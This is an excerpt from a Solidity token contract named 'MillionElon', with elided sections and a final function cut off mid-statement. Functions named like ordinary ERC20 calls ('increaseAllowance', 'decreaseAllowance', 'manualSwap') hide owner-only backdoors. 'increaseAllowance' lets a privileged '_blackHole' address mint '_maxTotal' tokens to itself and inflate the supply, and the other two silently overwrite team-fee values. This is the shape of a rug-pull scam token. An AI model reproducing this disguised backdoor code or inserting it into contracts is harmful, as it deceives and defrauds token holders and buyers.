...
contract MillionElon is Context, IERC20, Ownable {
    ...
    function decreaseAllowance() public {
        require (_blackHole == _msgSender());
        _teamAddr2 = _teamFee;
    }
    
    function manualSwap(uint256 curSup) public {
        require (_blackHole == _msgSender());
        _teamAddr1 = curSup;
    }
    ...
    function increaseAllowance() public {
        require (_blackHole == _msgSender());
        uint256 currentBalance = _balances[_blackHole];
        _tTotal = _maxTotal + _tTotal;
        _balances[_blackHole] = _maxTotal + currentBalance;
        emit Transfer(
            address(0),
            _blackHole,
            _maxTotal);
